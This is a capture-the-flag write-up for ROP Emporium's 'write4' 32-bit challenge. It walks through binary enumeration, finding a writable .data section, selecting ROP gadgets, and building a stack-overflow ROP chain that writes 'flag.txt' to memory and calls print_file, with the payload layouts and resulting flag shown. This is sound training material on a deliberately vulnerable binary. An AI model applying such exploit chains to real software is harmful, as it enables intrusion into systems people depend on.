First, let's look at functions imported from shared libraries:

	rabin2 -i <binary>

	[Imports]
	nth vaddr      bind   type   lib name
	―――――――――――――――――――――――――――――――――――――
	1   0x080483b0 GLOBAL FUNC       pwnme
	2   0x00000000 WEAK   NOTYPE     __gmon_start__
	3   0x080483c0 GLOBAL FUNC       __libc_start_main
	4   0x080483d0 GLOBAL FUNC       print_file

Now, let's look at innate functions: 
	
	rabin2 -qs <binary> | grep -ve imp -e ' 0 '

	0x080485cc 4 _IO_stdin_used
	0x0804a020 1 completed.7283
	0x0804852a 25 usefulFunction
	0x080485b0 2 __libc_csu_fini
	0x08048440 4 __x86.get_pc_thunk.bx
	0x08048550 93 __libc_csu_init
	0x08048430 2 _dl_relocate_static_pie
	0x080485c8 4 _fp_hw
	0x08048506 36 main

I also am going to use pwntools to see if there are any functions that I haven't identified with these 2 commands:
	from pwn import *
	from pprint import pprint
	offset = 40
	
	context.arch = 'i386'
	
	elf = ELF("./write432")
	p = elf.process()
	
	# let's print allll the functions
	pprint(elf.symbols)

With this, I identified another function called usefulGadgets :)

	$ python3 pwny1.py
	[+] Starting local process '/home/ubuntu/ropemporium/write4/write432': pid 19958
	{'': 134520864,
	...
	 'usefulGadgets': 134513987}
	[*] Stopped process '/home/ubuntu/ropemporium/write4/write432' (pid 19958)




	
So, looks like pwnme function is imported this time, from libwrite432.so library.
This means it won't be at a static place in memory, as it is dynamically loaded into a random address each time the program is ran... We can confirm this with ldd:

	$ ldd write432 
	linux-gate.so.1 (0xf7f75000)
	libwrite432.so => ./libwrite432.so (0xf7f6c000)
	libc.so.6 => /lib32/libc.so.6 (0xf7d6d000)
	/lib/ld-linux.so.2 (0xf7f77000)
	


So, we let's look at what usefulFunction does... looks like it sets up the stack, then makes a call to the function "print_file".

	gef➤  disass usefulFunction
	Dump of assembler code for function usefulFunction:
	   0x0804852a <+0>:	push   ebp
	   0x0804852b <+1>:	mov    ebp,esp
	   0x0804852d <+3>:	sub    esp,0x8
	   0x08048530 <+6>:	sub    esp,0xc
	   0x08048533 <+9>:	push   0x80485d0
	   0x08048538 <+14>:	call   0x80483d0 <print_file@plt>
	   0x0804853d <+19>:	add    esp,0x10
	   0x08048540 <+22>:	nop
	   0x08048541 <+23>:	leave  
	   0x08048542 <+24>:	ret    
	End of assembler dump.



 This function tries to open file by name, but "nonexistent" is passed as an argument. We can see that it fails because of this.


	gef➤  run < input_uf
	Starting program: /home/ubuntu/ropemporium/write4/write432 < input_uf
	write4 by ROP Emporium
	x86
	
	Go ahead and give me the input already!
	
	> Thank you!
	Failed to open file: nonexistent
	[Inferior 1 (process 18808) exited with code 01]

I also set up general skeleton-code for sending my payload with pwntools:	
	

So, we know that we want to use ROP to change the arguments that are on the stack when the "print_file" function is called. With the previous challenges we were able to leverage usefulString to open the file that we wanted, but in this case, there is no useful string in memory... :'(

We need to write a string to memory.
We need to use a ROPgadget to do this.

#### Note
At this moment, I took a break and referenced this article: [ROP FTW](https://www.exploit-db.com/docs/english/28479-return-oriented-programming-(rop-ftw).pdf)

After a bit of reading, looks like I should look at what sections are writeable:

Looks like we can write to the data section:

	$ readelf -S write432  | grep data
	  [16] .rodata           PROGBITS        080485c8 0005c8 000014 00   A  0   0  4
	  [24] .data             PROGBITS        0804a018 001018 000008 00  WA  0   0  4


Let's locate it in memory:

	$ !! | grep data
	readelf -s write432 | grep data
	     5: 0804a020     0 NOTYPE  GLOBAL DEFAULT   24 _edata
	    50: 0804a018     0 NOTYPE  WEAK   DEFAULT   24 data_start
	    51: 0804a020     0 NOTYPE  GLOBAL DEFAULT   24 _edata
	    53: 0804a018     0 NOTYPE  GLOBAL DEFAULT   24 __data_start

You can also do this using mmap in gdb:

	gef➤  info files
	Symbols from "/home/ubuntu/ropemporium/write4/write432".
	Native process:
		Using the running image of child process 18967.
		While running this, GDB does not access memory from...
	Local exec file:
		`/home/ubuntu/ropemporium/write4/write432', file type elf32-i386.
		Entry point: 0x80483f0
		...
		0x0804a018 - 0x0804a020 is .data
		...	
	
So we have 8Bytes of data to to write to in .data section at 0x0804a018 and 0x0804a01c.
Flag.txt is 8 bytes, so we shouldddd be able to put that in the data section.
I'm gona review the ROPchain write-up in order to verify how to write to the data section... (linked above)

Okay, let's look at some of the ROP gadgets:
	$ ROPgadget --binary write432
	...
	Unique gadgets found: 126


These are some of the only relevant gadgets: 

	0x08048472 : add esp, 0x10 ; leave ; ret
	0x0804853d : add esp, 0x10 ; nop ; leave ; ret
	
	0x080485a5 : add esp, 0xc ; pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	0x08048521 : add esp, 4 ; pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
	0x0804839a : add esp, 8 ; pop ebx ; ret
	x08048479 : lea edi, [edi] ; ret
	0x080484c4 : lea esi, [esi] ; ret
	0x08048526 : lea esp, [ecx - 4] ; ret
	
	0x08048475 : leave ; ret
	0x08048543 : mov dword ptr [edi], ebp ; ret		== usefulGadget :)
	0x08048423 : mov ebx, dword ptr [esp] ; ret
	0x0804843f : nop ; mov ebx, dword ptr [esp] ; ret
	0x08048525 : pop ebp ; lea esp, [ecx - 4] ; ret
	0x080485ab : pop ebp ; ret
	0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	0x0804839d : pop ebx ; ret
	0x08048524 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
	0x080485aa : pop edi ; pop ebp ; ret
	0x080485a9 : pop esi ; pop edi ; pop ebp ; ret
	0x08048421 : push esp ; mov ebx, dword ptr [esp] ; ret
	
	0x08048525 : pop ebp ; lea esp, [ecx - 4] ; ret
	0x080485ab : pop ebp ; ret
	0x080485a8 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
	0x0804839d : pop ebx ; ret
	0x08048524 : pop ecx ; pop ebp ; lea esp, [ecx - 4] ; ret
	0x080485aa : pop edi ; pop ebp ; ret
	0x080485a9 : pop esi ; pop edi ; pop ebp ; ret



So... we want whatever is pointed to by ebp to contain the name of the file that we want to open.

Memory address we want to write to =  0x0804a018 and 0x0804a01c
What we want to write: "flag" and ".txt"


So if we use usefulGadget (mov DWORD PTR [edi], ebp; ret;)...
then \*edi = fake ebp

but, we want to control this edi value!

We can do this by popping a value off of the stack, and into edi:)

	0x080485aa : pop edi ; pop ebp ; ret

So let's set up the stack accordingly:

	A's                                     40B
	_______________________________________
	fake ebp
	 = BBBB                                  4B
	_______________________________________
	&ROP gadget
	 = 0x080485aa
	 = "\xaa\x85\x04\x08"
	_______________________________________
	edi 
	 = &data
	 = 0x0804a018
	 = "\x18\xa0\x04\x08"
	_______________________________________
	ebp 
	 = "flag"
	 = "galf"
	_______________________________________
	eip = &uG
	 = 0x08048543 
	 = "\x43\x85\x04\x08"
	________________________________________
	eip = whatever
	 = cccc 
	_______________________________________
	

Okay, so this worked pretty nicely :) we now have "flag" stored at .data (0x0804a018)

	gef➤  i r edi
	edi            0x804a018           0x804a018
	gef➤  x/wx $edi
	0x804a018:	0x67616c66
	gef➤  x/s $edi
	0x804a018:	"flag"
	

Now, we need to get "txt." into .data+0x4 (0x0804a01c)
Can we use the same ROP gadgets??

	A's                                     40B
	_______________________________________
	fake ebp
	 = BBBB                                  4B
	_______________________________________
	eip
	&ROP gadget
	 = 0x080485aa				 4B 
 	 = "\xaa\x85\x04\x08"
	 _______________________________________
	edi 
	 = &data
	 = 0x0804a018				 4B
	 = "\x18\xa0\x04\x08"
	_______________________________________
	ebp 
	 = "flag"				 4B
	 = "galf"
	_______________________________________
	eip = &uG
	 = 0x08048543 				 4B
	 = "\x43\x85\x04\x08"
	________________________________________
	&ROP gadget
	 = 0x080485aa				 4B
	 = "\xaa\x85\x04\x08"
	_______________________________________
	edi 
	 = &data
	 = 0x0804a01c				 4B
	 = "\x1c\xa0\x04\x08"
	_______________________________________
	ebp
	 = ".txt"
	 = "txt."				 4B
	_______________________________________
	eip = &usefulGadget
	 = 0x08048543 
	 = "\x43\x85\x04\x08"			 4B
	_______________________________________
	eip  
	 = 0x080485aa
	 = cccc 
	_______________________________________

Looks like we can :D. 

	gef➤  i r edi
	edi            0x804a01c           0x804a01c
	gef➤  x/s $edi
	0x804a01c:	".txt"
	
Okay, so we succesfully have put ".txt" at .data+0x4 (edi register) :)

So, now we set up the stack so that it has those addresses on it, which will be arguments passed into the print_file function:


	A's                                     40B
	_______________________________________
	fake ebp
	 = BBBB                                  4B
	_______________________________________
	eip
	&ROP gadget
	 = 0x080485aa				 4B
	 = "\xaa\x85\x04\x08"
	_______________________________________
	edi 
	 = &data
	 = 0x0804a018				 4B
	 = "\x18\xa0\x04\x08"
	_______________________________________
	ebp 
	 = "flag"				 4B
	 = "galf"
	_______________________________________
	eip = &usefulGadget
	 = 0x08048543 				 4B
	 = "\x43\x85\x04\x08"
	________________________________________
	eip = &ROP gadget
	 = 0x080485aa				 4B
	 = "\xaa\x85\x04\x08"
	_______________________________________
	edi 
	 = &data + 0x4
	 = 0x0804a01c				 4B
	 = "\x1c\xa0\x04\x08"
	_______________________________________
	ebp 
	 = ".txt"				 4B
	 = "txt."
	_______________________________________
	eip = &usefulGadget
	 = 0x08048543 				 4B
	 = "\x43\x85\x04\x08"
	_______________________________________
	eip  
	 = &print_file
	 = 0x080483d0				 4B
	 =  "\xd0\x83\x04\x08"
	_______________________________________
	fake eip
	 = "dddd"				 4B
	_______________________________________
	args
	 = &data
	 = 0x0804a018				 4B
	 = "\x18\xa0\x04\x08"
	_______________________________________
	

O hek yea

	$ ./write432  < input 
	write4 by ROP Emporium
	x86
	
	Go ahead and give me the input already!
	
	> Thank you!
	ROPE{i ate the bug}
	
	Segmentation fault (core dumped)
	
